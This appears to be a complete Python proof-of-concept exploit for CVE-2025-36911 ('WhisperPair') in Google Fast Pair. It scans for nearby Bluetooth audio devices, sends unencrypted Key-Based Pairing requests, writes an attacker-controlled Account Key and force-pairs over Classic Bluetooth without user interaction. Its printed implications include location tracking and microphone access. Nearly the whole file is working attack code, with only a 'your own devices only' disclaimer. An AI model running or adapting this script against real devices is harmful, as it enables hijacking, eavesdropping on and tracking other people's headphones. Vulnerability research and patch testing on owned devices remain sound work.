#!/usr/bin/env python3
"""
WhisperPair PoC - CVE-2025-36911
================================

Proof of Concept for the WhisperPair vulnerability in Google Fast Pair.

KEY INSIGHT: Vulnerable devices accept RAW unencrypted Key-Based Pairing
requests - we don't need the Anti-Spoofing Public Key at all!

The exploit:
1. Send raw KBP request with salt (salt becomes shared secret)
2. Device responds with encrypted BR/EDR address
3. Parse response to extract BR/EDR address
4. Pair via Classic Bluetooth
5. Write Account Key to hijack device

For security research and testing on YOUR OWN devices only.

References:
- CVE-2025-36911
- https://whisperpair.eu
"""

import os
import re
import asyncio
import struct
import subprocess
import secrets
from datetime import datetime
from collections import Counter
from dataclasses import dataclass
from enum import IntEnum
from typing import Optional, List, Callable
from bleak import BleakClient, BleakScanner
from bleak.exc import BleakError
from colorama import init, Fore, Style
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import math

import re
import subprocess

LOG_BIN = "/usr/bin/LOG"

# Strip ANSI escape sequences (colorama, etc)
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

def _strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s)

def LOG(color: str, message: str) -> None:
    """
    Send a single log line to /usr/bin/LOG.

    color: whatever your LOG binary expects (e.g. RED, GREEN, BLUE, YELLOW, CYAN, WHITE)
    message: the human-readable log line
    """
    try:
        # Important: pass args as a list (no shell=True)
        subprocess.run([LOG_BIN, str(color), str(message)], check=False)
    except Exception:
        # Fail silent on embedded targets
        pass

def log_print(*args, color: str = "WHITE", sep: str = " ", end: str = "\n") -> None:
    """
    Drop-in 'print replacement' that logs instead.
    Usage:
        log_print("Entropy:", f"{x:.2f}", color="CYAN")
    """
    s = sep.join(str(a) for a in args) + end

    # preserve print-like behavior, but keep LOG entries clean
    s = _strip_ansi(s).rstrip("\n")

    # avoid sending empty strings unless you want blank lines in the payload log
    if s:
        LOG(color, s)


init()


# ==============================================================================
# CONSTANTS
# ==============================================================================

# Fast Pair Service and Characteristics
SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
CHAR_MODEL_ID = "fe2c1233-8366-4814-8eb0-01de32100bea"
CHAR_KEY_PAIRING = "fe2c1234-8366-4814-8eb0-01de32100bea"
CHAR_PASSKEY = "fe2c1235-8366-4814-8eb0-01de32100bea"
CHAR_ACCOUNT_KEY = "fe2c1236-8366-4814-8eb0-01de32100bea"


class MessageType(IntEnum):
    KEY_BASED_PAIRING_REQUEST = 0x00
    KEY_BASED_PAIRING_RESPONSE = 0x01
    SEEKER_PASSKEY = 0x02
    PROVIDER_PASSKEY = 0x03


class ExploitStrategy(IntEnum):
    """Exploit strategies - tried in order until one succeeds"""
    RAW_KBP = 0           # Raw unencrypted (most common for vulnerable devices)
    RAW_WITH_SEEKER = 1   # Raw with seeker address for bonding
    RETROACTIVE = 2       # With retroactive pairing flag
    EXTENDED_RESPONSE = 3 # Request extended response format


# ==============================================================================
# EXPLOIT RESULT TYPES
# ==============================================================================

@dataclass
class ExploitResult:
    success: bool
    vulnerable: bool
    br_edr_address: Optional[str]
    paired: bool
    account_key_written: bool
    message: str
    notifications: List[dict]


# ==============================================================================
# AES CRYPTO (Simple - using salt as shared secret)
# ==============================================================================

def aes_encrypt(key: bytes, data: bytes) -> bytes:
    """AES-128-ECB encrypt"""
    if len(key) < 16:
        key = key.ljust(16, b'\x00')
    cipher = Cipher(algorithms.AES(key[:16]), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()


def aes_decrypt(key: bytes, data: bytes) -> bytes:
    """AES-128-ECB decrypt"""
    if len(key) < 16:
        key = key.ljust(16, b'\x00')
    cipher = Cipher(algorithms.AES(key[:16]), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data) + decryptor.finalize()


# ==============================================================================
# REQUEST BUILDERS
# ==============================================================================

def build_raw_kbp_request(target_address: str) -> tuple[bytes, bytes]:
    """
    Build a raw Key-Based Pairing request.

    This is the key insight: vulnerable devices accept unencrypted requests!
    The salt becomes our "shared secret" for decrypting responses.

    Returns: (request_bytes, shared_secret)
    """
    address_bytes = bytes.fromhex(target_address.replace(':', ''))
    salt = secrets.token_bytes(8)

    request = bytearray(16)
    request[0] = MessageType.KEY_BASED_PAIRING_REQUEST  # 0x00
    request[1] = 0x11  # Flags: INITIATE_BONDING (bit 0) + EXTENDED_RESPONSE (bit 4)
    request[2:8] = address_bytes
    request[8:16] = salt

    # Salt becomes shared secret (padded to 16 bytes)
    shared_secret = salt + bytes(8)

    return bytes(request), shared_secret


def build_retroactive_request(target_address: str, seeker_address: str = "00:00:00:00:00:00") -> tuple[bytes, bytes]:
    """Build request with retroactive pairing flag (bypasses some checks)"""
    target_bytes = bytes.fromhex(target_address.replace(':', ''))
    seeker_bytes = bytes.fromhex(seeker_address.replace(':', ''))
    salt = secrets.token_bytes(2)

    request = bytearray(16)
    request[0] = MessageType.KEY_BASED_PAIRING_REQUEST
    request[1] = 0x0A  # Flags: Bit 1 (bonding) + Bit 3 (retroactive)
    request[2:8] = target_bytes
    request[8:14] = seeker_bytes
    request[14:16] = salt

    shared_secret = secrets.token_bytes(16)
    return bytes(request), shared_secret


def build_extended_request(target_address: str) -> tuple[bytes, bytes]:
    """Build request for extended response format"""
    address_bytes = bytes.fromhex(target_address.replace(':', ''))
    salt = secrets.token_bytes(8)

    request = bytearray(16)
    request[0] = MessageType.KEY_BASED_PAIRING_REQUEST
    request[1] = 0x10  # Bit 4: Request extended response
    request[2:8] = address_bytes
    request[8:16] = salt

    shared_secret = salt + bytes(8)
    return bytes(request), shared_secret


# ==============================================================================
# RESPONSE PARSING
# ==============================================================================

def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy"""
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    return -sum((c/length) * math.log2(c/length) for c in counts.values())


def is_valid_mac(address: str) -> bool:
    """Check if address looks like a valid Bluetooth MAC"""
    if address in ("00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"):
        return False
    parts = address.split(':')
    if len(parts) != 6:
        return False
    try:
        return all(0 <= int(p, 16) <= 255 for p in parts)
    except ValueError:
        return False


def extract_address(data: bytes, offset: int) -> str:
    """Extract MAC address from bytes at offset"""
    if offset + 6 > len(data):
        return "00:00:00:00:00:00"
    return ':'.join(f'{b:02X}' for b in data[offset:offset+6])


def parse_kbp_response(data: bytes, shared_secret: Optional[bytes] = None) -> Optional[str]:
    """
    Robust response parsing with multiple strategies.
    Returns BR/EDR address if found, None otherwise.
    """
    if len(data) < 7:
        return None

    # Strategy 1: Standard response format (type 0x01)
    if data[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
        addr = extract_address(data, 1)
        if is_valid_mac(addr):
            return addr

    # Strategy 2: Extended response format (type 0x02)
    if data[0] == 0x02 and len(data) >= 9:
        addr_count = data[2]
        if addr_count >= 1:
            addr = extract_address(data, 3)
            if is_valid_mac(addr):
                return addr

    # Strategy 3: Decrypt with shared secret
    if shared_secret and len(data) == 16:
        try:
            decrypted = aes_decrypt(shared_secret, data)
            if decrypted[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
                addr = extract_address(decrypted, 1)
                if is_valid_mac(addr):
                    return addr
        except Exception:
            pass

    # Strategy 4: Brute force scan for valid MAC pattern
    for offset in range(len(data) - 5):
        addr = extract_address(data, offset)
        if is_valid_mac(addr):
            return addr

    return None


# ==============================================================================
# CLASSIC BLUETOOTH PAIRING (via bluetoothctl)
# ==============================================================================

def run_cmd(cmd: str, timeout: int = 30) -> tuple[str, int]:
    """Run shell command"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "Timeout", -1
    except Exception as e:
        return str(e), -1


def pair_classic_bluetooth(mac: str) -> bool:
    """Pair with device via bluetoothctl"""
    log_print(f"{Fore.BLUE}[*] Initiating Classic Bluetooth pairing with {mac}...{Style.RESET_ALL}")

    # Trust first (helps with some devices)
    run_cmd(f"bluetoothctl trust {mac}")

    # Pair
    output, code = run_cmd(f"bluetoothctl pair {mac}", timeout=25)

    if "successful" in output.lower():
        log_print(f"{Fore.GREEN}[+] Pairing successful!{Style.RESET_ALL}")
        return True
    elif "already paired" in output.lower():
        log_print(f"{Fore.YELLOW}[!] Device already paired{Style.RESET_ALL}")
        return True
    else:
        log_print(f"{Fore.RED}[-] Pairing failed: {output[:100]}{Style.RESET_ALL}")
        return False


def connect_classic_bluetooth(mac: str) -> bool:
    """Connect to paired device"""
    log_print(f"{Fore.BLUE}[*] Connecting to {mac}...{Style.RESET_ALL}")
    output, code = run_cmd(f"bluetoothctl connect {mac}", timeout=15)

    if "successful" in output.lower():
        log_print(f"{Fore.GREEN}[+] Connected!{Style.RESET_ALL}")
        return True
    else:
        log_print(f"{Fore.YELLOW}[-] Connection failed{Style.RESET_ALL}")
        return False


# ==============================================================================
# MAIN EXPLOIT CLASS
# ==============================================================================

class WhisperPairExploit:
    """
    WhisperPair CVE-2025-36911 Exploit

    Exploits the fact that vulnerable Fast Pair devices accept
    Key-Based Pairing requests even when NOT in pairing mode.
    """

    def __init__(self, target_address: str):
        self.target_address = target_address
        self.client: Optional[BleakClient] = None
        self.notifications: List[dict] = []
        self.shared_secret: Optional[bytes] = None
        self.br_edr_address: Optional[str] = None
        self.model_id: Optional[str] = None
        self.kbp_response: Optional[bytes] = None
        self.notification_event = asyncio.Event()

    def _notification_handler(self, sender, data: bytes):
        """Handle GATT notifications"""
        char_uuid = str(sender.uuid).lower() if hasattr(sender, 'uuid') else str(sender)

        entry = {
            'characteristic': char_uuid,
            'data': data,
            'hex': data.hex(),
            'length': len(data),
            'entropy': calculate_entropy(data),
            'timestamp': datetime.now().isoformat()
        }
        self.notifications.append(entry)

        log_print(f"\n{Fore.CYAN}{'─' * 50}")
        log_print(f"📥 NOTIFICATION ({len(data)} bytes)")
        log_print(f"{'─' * 50}{Style.RESET_ALL}")
        log_print(f"Raw: {data.hex()}")
        log_print(f"Entropy: {entry['entropy']:.2f} bits/byte")

        # Check if this is a KBP response
        if "1234" in char_uuid:
            self.kbp_response = data

            # Try to parse BR/EDR address
            addr = parse_kbp_response(data, self.shared_secret)
            if addr:
                self.br_edr_address = addr
                log_print(f"{Fore.GREEN}BR/EDR Address: {addr}{Style.RESET_ALL}")
            else:
                # Fallback: use BLE address
                log_print(f"{Fore.YELLOW}Could not parse BR/EDR, will use BLE address{Style.RESET_ALL}")

        log_print(f"{Fore.CYAN}{'─' * 50}{Style.RESET_ALL}\n")
        self.notification_event.set()

    async def connect(self) -> bool:
        """Connect to target device"""
        log_print(f"{Fore.BLUE}[*] Connecting to {self.target_address}...{Style.RESET_ALL}")

        try:
            self.client = BleakClient(self.target_address, timeout=15.0)
            await self.client.connect()

            if self.client.is_connected:
                log_print(f"{Fore.GREEN}[+] Connected!{Style.RESET_ALL}")
                return True
            return False
        except Exception as e:
            log_print(f"{Fore.RED}[-] Connection failed: {e}{Style.RESET_ALL}")
            return False

    async def disconnect(self):
        """Disconnect from device"""
        if self.client and self.client.is_connected:
            await self.client.disconnect()

    async def read_model_id(self) -> Optional[str]:
        """Read device Model ID"""
        try:
            data = await self.client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                self.model_id = f"0x{model_id:06X}"
                log_print(f"{Fore.BLUE}[*] Model ID: {self.model_id}{Style.RESET_ALL}")
                return self.model_id
        except Exception as e:
            log_print(f"{Fore.YELLOW}[!] Could not read Model ID: {e}{Style.RESET_ALL}")
        return None

    async def subscribe_notifications(self):
        """Subscribe to Fast Pair notifications"""
        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await self.client.start_notify(char_uuid, self._notification_handler)
                log_print(f"{Fore.GREEN}[+] Subscribed to notifications{Style.RESET_ALL}")
            except Exception as e:
                log_print(f"{Fore.YELLOW}[!] Could not subscribe: {e}{Style.RESET_ALL}")

    async def send_kbp_request(self, strategy: ExploitStrategy) -> bool:
        """Send Key-Based Pairing request with given strategy"""

        # Build request based on strategy
        if strategy == ExploitStrategy.RAW_KBP:
            request, self.shared_secret = build_raw_kbp_request(self.target_address)
            strategy_name = "RAW_KBP"
        elif strategy == ExploitStrategy.RETROACTIVE:
            request, self.shared_secret = build_retroactive_request(self.target_address)
            strategy_name = "RETROACTIVE"
        elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
            request, self.shared_secret = build_extended_request(self.target_address)
            strategy_name = "EXTENDED"
        else:
            request, self.shared_secret = build_raw_kbp_request(self.target_address)
            strategy_name = "RAW"

        log_print(f"\n{Fore.BLUE}[*] Sending KBP Request ({strategy_name}){Style.RESET_ALL}")
        log_print(f"    Request: {request.hex()}")

        try:
            self.notification_event.clear()
            await self.client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)
            log_print(f"{Fore.RED}[!] KBP WRITE ACCEPTED - Device is VULNERABLE!{Style.RESET_ALL}")

            # Wait for response notification
            log_print(f"{Fore.BLUE}[*] Waiting for device response...{Style.RESET_ALL}")
            try:
                await asyncio.wait_for(self.notification_event.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                log_print(f"{Fore.YELLOW}[!] No notification received (timeout){Style.RESET_ALL}")

            return True

        except Exception as e:
            error_str = str(e).lower()
            if "not permitted" in error_str or "rejected" in error_str:
                log_print(f"{Fore.GREEN}[+] KBP rejected (device may be patched){Style.RESET_ALL}")
            else:
                log_print(f"{Fore.YELLOW}[-] KBP write failed: {e}{Style.RESET_ALL}")
            return False

    async def write_account_key(self) -> bool:
        """Write Account Key to hijack device"""
        log_print(f"\n{Fore.BLUE}[*] Writing Account Key...{Style.RESET_ALL}")

        # Generate account key (starts with 0x04)
        account_key = bytearray(16)
        account_key[0] = 0x04
        account_key[1:16] = secrets.token_bytes(15)

        # Encrypt if we have shared secret
        if self.shared_secret:
            data_to_write = aes_encrypt(self.shared_secret, bytes(account_key))
        else:
            data_to_write = bytes(account_key)

        log_print(f"    Account Key: {bytes(account_key).hex()}")

        try:
            await self.client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
            log_print(f"{Fore.GREEN}[+] Account Key written successfully!{Style.RESET_ALL}")
            return True
        except Exception as e:
            log_print(f"{Fore.YELLOW}[-] Account Key write failed: {e}{Style.RESET_ALL}")
            return False

    async def run_exploit(self) -> ExploitResult:
        """Run the full exploit chain"""

        log_print(f"\n{'='*60}")
        log_print(f"{Fore.RED}WhisperPair PoC - CVE-2025-36911{Style.RESET_ALL}")
        log_print(f"{'='*60}")
        log_print(f"Target: {self.target_address}")
        log_print(f"Time: {datetime.now().isoformat()}")
        log_print(f"\n{Fore.YELLOW}[!] Ensure device is NOT in pairing mode for valid test!{Style.RESET_ALL}")

        result = ExploitResult(
            success=False,
            vulnerable=False,
            br_edr_address=None,
            paired=False,
            account_key_written=False,
            message="",
            notifications=[]
        )

        try:
            # Step 1: Connect
            if not await self.connect():
                result.message = "Connection failed"
                return result

            # Step 2: Read Model ID
            await self.read_model_id()

            # Step 3: Subscribe to notifications
            await self.subscribe_notifications()
            await asyncio.sleep(0.5)

            # Step 4: Try exploit strategies
            strategies = [
                ExploitStrategy.RAW_KBP,
                ExploitStrategy.EXTENDED_RESPONSE,
                ExploitStrategy.RETROACTIVE,
            ]

            kbp_accepted = False
            for strategy in strategies:
                log_print(f"\n{Fore.CYAN}{'─'*60}")
                log_print(f"Trying strategy: {strategy.name}")
                log_print(f"{'─'*60}{Style.RESET_ALL}")

                if await self.send_kbp_request(strategy):
                    kbp_accepted = True
                    result.vulnerable = True
                    break

                await asyncio.sleep(1)

            if not kbp_accepted:
                result.message = "All strategies rejected - device appears patched"
                return result

            # Step 5: Determine BR/EDR address
            if not self.br_edr_address:
                # Fallback: use BLE address
                self.br_edr_address = self.target_address
                log_print(f"{Fore.YELLOW}[!] Using BLE address as BR/EDR fallback{Style.RESET_ALL}")

            result.br_edr_address = self.br_edr_address

            # Step 6: Write Account Key
            await asyncio.sleep(0.5)
            result.account_key_written = await self.write_account_key()

            # Step 7: Disconnect BLE
            await self.disconnect()

            # Step 8: Pair via Classic Bluetooth
            log_print(f"\n{Fore.CYAN}{'─'*60}")
            log_print(f"Classic Bluetooth Pairing")
            log_print(f"{'─'*60}{Style.RESET_ALL}")

            result.paired = pair_classic_bluetooth(self.br_edr_address)

            if result.paired:
                connect_classic_bluetooth(self.br_edr_address)

            result.success = result.vulnerable and (result.paired or result.account_key_written)
            result.notifications = self.notifications

            if result.success:
                result.message = "Exploit successful!"
            else:
                result.message = "Partial success - device is vulnerable"

            return result

        except Exception as e:
            result.message = f"Error: {e}"
            return result

        finally:
            await self.disconnect()

    def print_summary(self, result: ExploitResult):
        """Print exploit summary"""
        log_print(f"\n{'='*60}")
        log_print(f"{Fore.CYAN}EXPLOIT RESULTS{Style.RESET_ALL}")
        log_print(f"{'='*60}")

        if result.vulnerable:
            log_print(f"\n{Fore.RED}╔════════════════════════════════════════════════════════╗")
            log_print(f"║  ⚠️  DEVICE IS VULNERABLE TO CVE-2025-36911  ⚠️          ║")
            log_print(f"╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        else:
            log_print(f"\n{Fore.GREEN}[+] Device appears to be patched{Style.RESET_ALL}")
            return

        log_print(f"\n{Fore.YELLOW}Results:{Style.RESET_ALL}")
        log_print(f"  Model ID: {self.model_id or 'Unknown'}")
        log_print(f"  BR/EDR Address: {result.br_edr_address or 'Unknown'}")
        log_print(f"  KBP Accepted: {Fore.RED}YES{Style.RESET_ALL}")
        log_print(f"  Account Key Written: {'YES' if result.account_key_written else 'NO'}")
        log_print(f"  Classic BT Paired: {'YES' if result.paired else 'NO'}")

        log_print(f"\n{Fore.YELLOW}Notifications received: {len(result.notifications)}{Style.RESET_ALL}")
        for i, n in enumerate(result.notifications, 1):
            log_print(f"  [{i}] {n['hex']} (entropy: {n['entropy']:.2f})")

        log_print(f"\n{Fore.YELLOW}Implications:{Style.RESET_ALL}")
        log_print(f"  - Attacker within BLE range (~30m) can force-pair")
        log_print(f"  - No user interaction required on target device")
        if result.account_key_written:
            log_print(f"  {Fore.RED}- Account key written: device hijacking possible{Style.RESET_ALL}")
            log_print(f"  {Fore.RED}- Find Hub tracking may be possible{Style.RESET_ALL}")
        if result.paired:
            log_print(f"  {Fore.RED}- Device paired: audio/mic access possible via HFP{Style.RESET_ALL}")


# ==============================================================================
# SCANNER
# ==============================================================================

async def scan_for_targets(timeout: int = 10) -> List[dict]:
    """Scan for Fast Pair devices"""
    log_print(f"{Fore.BLUE}[*] Scanning for Fast Pair devices ({timeout}s)...{Style.RESET_ALL}")

    devices = await BleakScanner.discover(timeout=timeout, return_adv=True)
    candidates = []

    for addr, (dev, adv) in devices.items():
        is_fast_pair = False

        if adv.service_uuids:
            for uuid in adv.service_uuids:
                if "fe2c" in str(uuid).lower():
                    is_fast_pair = True
                    break

        if adv.service_data and not is_fast_pair:
            for uuid in adv.service_data.keys():
                if "fe2c" in str(uuid).lower():
                    is_fast_pair = True
                    break

        if is_fast_pair:
            name = dev.name or adv.local_name or "Unknown"
            candidates.append({
                'address': addr,
                'name': name,
                'rssi': adv.rssi
            })
            log_print(f"{Fore.GREEN}[+] Found: {name} ({addr}) RSSI: {adv.rssi}{Style.RESET_ALL}")

    candidates.sort(key=lambda x: x['rssi'], reverse=True)
    return candidates


# ==============================================================================
# MAIN
# ==============================================================================

async def main():
    import sys

    log_print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    log_print(f"║  WhisperPair PoC - CVE-2025-36911                        ║")
    log_print(f"║  Fast Pair Pairing Mode Bypass                           ║")
    log_print(f"║                                                          ║")
    log_print(f"║  FOR SECURITY RESEARCH ON YOUR OWN DEVICES ONLY          ║")
    log_print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        targets = await scan_for_targets()

        if not targets:
            log_print(f"{Fore.RED}[-] No Fast Pair devices found{Style.RESET_ALL}")
            return

        log_print(f"\n{Fore.GREEN}[+] Found {len(targets)} device(s){Style.RESET_ALL}")
        target = targets[0]['address']
        log_print(f"{Fore.BLUE}[*] Using: {targets[0]['name']} ({target}){Style.RESET_ALL}")

    input(f"\n{Fore.YELLOW}Press Enter to start exploit...{Style.RESET_ALL}")

    exploit = WhisperPairExploit(target)
    result = await exploit.run_exploit()
    exploit.print_summary(result)

    # Save results
    import json
    filename = f"whisperpair_result_{target.replace(':', '-')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    result_dict = {
        'target': target,
        'model_id': exploit.model_id,
        'vulnerable': result.vulnerable,
        'br_edr_address': result.br_edr_address,
        'paired': result.paired,
        'account_key_written': result.account_key_written,
        'message': result.message,
        'notifications': [
            {'hex': n['hex'], 'entropy': n['entropy']}
            for n in result.notifications
        ],
        'timestamp': datetime.now().isoformat()
    }

    with open(filename, 'w') as f:
        json.dump(result_dict, f, indent=2)

    log_print(f"\n{Fore.BLUE}[+] Results saved to: {filename}{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log_print(f"\n{Fore.YELLOW}[!] Cancelled by user{Style.RESET_ALL}")
